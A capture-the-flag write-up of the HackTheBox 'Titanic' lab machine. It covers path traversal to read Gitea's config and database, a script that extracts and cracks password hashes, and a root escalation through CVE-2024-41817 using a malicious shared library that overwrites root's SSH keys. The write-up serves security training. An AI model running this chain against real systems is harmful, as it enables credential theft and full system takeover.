# Titanic — HackTheBox Writeup

**Machine IP**: `10.10.11.??`
**Author**: Mridul Chamoli
**Difficulty**: Medium
**Category**: Linux | Web | Path Traversal | Privilege Escalation (ImageMagick RCE)

---

## 🛳️ Overview

Titanic is a Linux machine that revolves around:

* **Exploiting a path traversal vulnerability** in the Titanic Booking System
* **Extracting Gitea SQLite credentials** to gain SSH access
* **Privilege escalation** via **CVE‑2024‑41817** — an ImageMagick AppImage arbitrary code execution vulnerability

This multi‑stage attack chain demonstrates modern web exploitation, Docker data leakage, and abusing vulnerable AppImage loader behavior for root access.

---

## 🔍 Enumeration

### NMAP

```bash
thanatos@kali:/home/thanatos/Desktop/htb/machines/titanic$ nmap -sT -p- --min-rate 10000 10.10.11.48 -Pn -oA nmap_ports
thanatos@kali:/home/thanatos/Desktop/htb/machines/titanic$ nmap -sC -sV -p 22,80 10.10.11.48 -Pn -oA nmap_ports_details
```

**Results:**

* `22/tcp` — OpenSSH 8.9p1
* `80/tcp` — Apache 2.4.52 serving **titanic.htb**

We add it to `/etc/hosts`:

```
10.10.11.48 titanic.htb
```

---

## 🚢 Titanic Booking Website

Visiting `titanic.htb` shows a Titanic‑themed booking system. The **Book Now** button triggers a form that, after submission, downloads a JSON ticket file.

Capturing the request in Burp reveals a parameter:

```
/download?ticket=<filename>
```

Changing the value to `/etc/passwd` returns the file contents — confirming **path traversal**.

---

## 🧪 VHost Enumeration

We run FFUF:

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.titanic.htb' -u http://titanic.htb
```

We discover:

```
dev.titanic.htb
```

Add to hosts:

```
10.10.11.48 dev.titanic.htb
```

---

## 🧱 Exploring dev.titanic.htb — Gitea

The dev vhost hosts a **Gitea instance** with two repos:

* `docker-config`
* `flask-app`

`flask-app` contains the source for the booking system — including the vulnerable download endpoint.

`docker-config` contains Docker Compose files showing MySQL + Gitea running internally.

The config references:

```
/home/developer/gitea/data
```

Thus Gitea's **app.ini** is likely there.

---

## 📄 Reading Gitea Configuration (via Path Traversal)

Try default path:

```
/etc/gitea/conf/app.ini → NOT FOUND
```

Try Docker volume path:

```
/home/developer/gitea/data/gitea/conf/app.ini
```

Success — config file retrieved.

It shows a SQLite DB:

```
/data/gitea/gitea.db
```

Download it:

```bash
curl "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db" -o gitea.db
```

---

## 🔐 Extracting & Cracking Gitea Passwords

Dump the hashes:

```bash
sqlite3 gitea.db "select passwd,salt,name from user" | while read data; do \
    digest=$(echo "$data" | cut -d'|' -f1 | xxd -r -p | base64); \
    salt=$(echo "$data" | cut -d'|' -f2 | xxd -r -p | base64); \
    name=$(echo $data | cut -d'|' -f 3); \
    echo "${name}:sha256:50000:${salt}:${digest}"; \
    done | tee gitea.hashes
```

Crack using Hashcat:

```bash
hashcat gitea.hashes /usr/share/wordlists/rockyou.txt --user
```

Only **developer**'s password is cracked.

We use it to SSH into the machine.

```bash
ssh developer@titanic.htb
```

User access achieved.

---

# ⬆️ Privilege Escalation — ImageMagick RCE (CVE‑2024‑41817)

While enumerating, we find:

```
/opt/scripts/identify_images.sh
```

The script:

* cd’s into an images folder
* clears `metadata.log`
* runs ImageMagick `identify` on all `.jpg` files
* executed by **cron as root**

The installed version:

```
ImageMagick 7.1.1-35
```

Searching reveals **CVE-2024‑41817** — arbitrary code execution via AppImage LD_LIBRARY_PATH hijacking.

### Writable Image Directory

The script processes files in:

```
/opt/app/static/assets/images
```

This directory is writable by `developer` → perfect for planting a malicious library.

---

## 💣 Crafting a Malicious Shared Library

We generate a malicious `libxcb.so.1` that writes our SSH key to root's authorized_keys:

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("sh -c 'echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMp2OUJIxIRJR/hDD6eEsLEnypGSAngc0n3oqoQa8pUF wasay@kali > /root/.ssh/authorized_keys'");
    exit(0);
}
EOF
```

Copy it to the images folder:

```bash
cp libxcb.so.1 /opt/app/static/assets/images/
```

### Wait for Cron

Within ~1 minute, the cronjob triggers:

* ImageMagick loads our fake libxcb.so.1
* Root’s authorized_keys is overwritten with our key

---

## 🔑 Root Access

SSH as root:

```bash
ssh -i id_ed25519 root@titanic.htb
```

Root shell achieved.

---

## 🧠 Key Takeaways

| Stage                 | Technique                                   |
| --------------------- | ------------------------------------------- |
| Initial Enumeration   | Nmap, vhost discovery                       |
| Foothold              | Path traversal → Gitea SQLite DB extraction |
| Credential Harvesting | PBKDF2 hash cracking via Hashcat            |
| PrivEsc               | ImageMagick AppImage RCE (CVE‑2024‑41817)   |

---

## Directory Used

```
thanatos@kali:/home/thanatos/Desktop/htb/machines/titanic
```

---

### 🎯 Flags

* `user.txt` — obtained after SSH as developer
* `root.txt` — obtained after exploiting CVE‑2024‑41817

---

**Happy hacking, explorer! 🚢🔥**
